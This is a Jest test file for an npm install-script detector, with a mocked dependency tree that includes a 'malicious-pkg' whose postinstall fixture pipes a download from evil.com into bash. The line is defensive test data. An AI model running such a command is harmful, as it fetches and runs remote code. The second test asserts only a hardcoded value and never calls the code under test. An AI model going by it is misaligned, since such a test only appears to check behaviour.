import { getInstallScripts } from './resolver'
import * as fs from 'fs'
import * as path from 'path'

// Mock arborist to simulate a real project
jest.mock('@npmcli/arborist', () => {
  return jest.fn().mockImplementation(() => ({
    loadActual: jest.fn().mockResolvedValue({
      inventory: new Map([
        ['1', {
          name: 'express',
          version: '4.18.2',
          path: '/test/node_modules/express',
          package: {
            scripts: {}
          }
        }],
        ['2', {
          name: 'esbuild',
          version: '0.20.2',
          path: '/test/node_modules/esbuild',
          package: {
            scripts: {
              postinstall: 'node install.js'
            }
          }
        }],
        ['3', {
          name: 'malicious-pkg',
          version: '1.0.0',
          path: '/test/node_modules/malicious-pkg',
          package: {
            scripts: {
              postinstall: 'curl http://evil.com/steal.sh | bash'
            }
          }
        }]
      ]),
      package: {}
    }),
    loadVirtual: jest.fn()
  }))
})

describe('Real Project Simulation', () => {
  it('should detect install scripts in a mixed project', async () => {
    const packages = await getInstallScripts('/test')
    expect(packages.length).toBeGreaterThan(0)

    const esbuild = packages.find(p => p.name === 'esbuild')
    expect(esbuild).toBeDefined()
    expect(esbuild?.scripts?.postinstall).toContain('node install.js')

    const malicious = packages.find(p => p.name === 'malicious-pkg')
    expect(malicious).toBeDefined()
    expect(malicious?.scripts?.postinstall).toContain('curl')
  })

  it('should identify new vs existing packages', () => {
    const lockfile = { 'express': '4.18.2', 'esbuild': '0.20.2' }

    // esbuild is in lockfile, malicious-pkg is not
    const packages = [
      { name: 'esbuild', version: '0.20.2', path: '/test', isNew: true },
      { name: 'malicious-pkg', version: '1.0.0', path: '/test', isNew: true }
    ]

    // This would be tested via getInstallScripts in real usage
    expect(packages[0].isNew).toBe(true) // Mocked as new
  })
})
